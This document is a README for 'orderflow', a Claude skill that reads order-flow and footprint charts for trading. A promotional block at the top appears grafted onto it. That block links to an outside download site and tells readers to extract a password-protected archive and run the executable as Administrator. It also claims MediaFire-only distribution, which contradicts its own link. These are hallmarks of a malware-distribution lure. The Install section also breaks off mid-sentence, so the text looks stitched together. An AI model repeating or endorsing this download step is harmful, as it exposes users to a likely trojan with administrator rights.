<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# orderflow — an evidence-graded order-flow & footprint skill for Claude

Reads footprint and order-flow charts like a skeptical quant: splits measured data from
inference, insists on location, and tells you which patterns have actually been tested
(almost none have).

## What it does
- **Reads chart screenshots** (footprint, volume profile, DOM, heatmap, CVD, OI) with a fixed
  10-step protocol: sides established from the legend or printed delta, never from colour; row
  size measured from the image; time zone never assumed; unreadable numbers flagged, not guessed.
- **Explains concepts**: delta, CVD, diagonal and stacked imbalances, absorption vs stalls,
  finished/unfinished auctions, POC/value area/VWAP, OFI and why delta and price disagree.
- **Judges setups** as falsifiable rule cards (13 of them): mechanism, conditions, entry, stop,
  failure modes, counterexample, evidence tier, test status.
- **BTC specifics**: venue fragmentation, wash trading, funding, OI × delta labels as
  probabilities, liquidation cascades, spot vs perp.
- **Says what footprints are good for**: a horizon map from ticks to hours, and the practical
  uses the evidence supports: diagnosing the move that just printed, reading liquidity to adjust
  risk, defining invalidation, filtering a setup that stands on its own (with a test procedure),
  and execution timing.
- **Vets claims** from videos, courses and vendors against base rates and a checklist.

## What it won't do
Give trade calls. Its directional lean defaults to "none" and it answers with conditional
scenarios, plus what the chart is useful for at the horizon the evidence covers. It will not call a pattern "high probability" without a cited test.

## Evidence it rests on
Peer-reviewed market-microstructure research (Cont, Kukanov & Stoikov; Gould & Bonart; Bouchaud
et al.; Makarov & Schoar, and others; full list in `references/evidence.md`), plus the author's
own event studies on Binance BTCUSDT 2020-2024 after fees, which found no edge in absorption,
sweep/failed-auction or spot-confirmation setups (`references/backtests.md`). Those tests are
unpublished and not independently replicated; the skill says so whenever it cites them.

## Install

**Claude app (web/desktop):** download `orderflow.zip` from the
## Optional script
`scripts/check_screenshot.py` (Python 3, standard library only) checks a screenshot
transcription for internal consistency and, given raw trades such as a Binance aggTrades CSV
from data.binance.vision, rebuilds the bar and compares it cell by cell. Run with `--help`.

## Contents
```
orderflow/
├── SKILL.md                  ground rules, workflow router, answer format
├── references/
│   ├── visual-analysis.md    screenshot protocol + A–H output format
│   ├── chart-types.md        every format, verified platform conventions
│   ├── concepts.md           mechanics, quantities, OFI, participants
│   ├── uses.md               what footprints are good for, by horizon
│   ├── setups.md             13 rule cards with test status
│   ├── backtests.md          the author's tests: scope and results
│   ├── btc.md                crypto market structure
│   └── evidence.md           tiers, base rates, misconceptions, reading list
└── scripts/check_screenshot.py
```

## Disclaimer
Educational analysis only, not financial advice. Trading is risky; most active day traders lose
money (see the base rates in `references/evidence.md`).

Author: Sergiu.


---

MIT License

Copyright (c) 2026 NaCl63

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
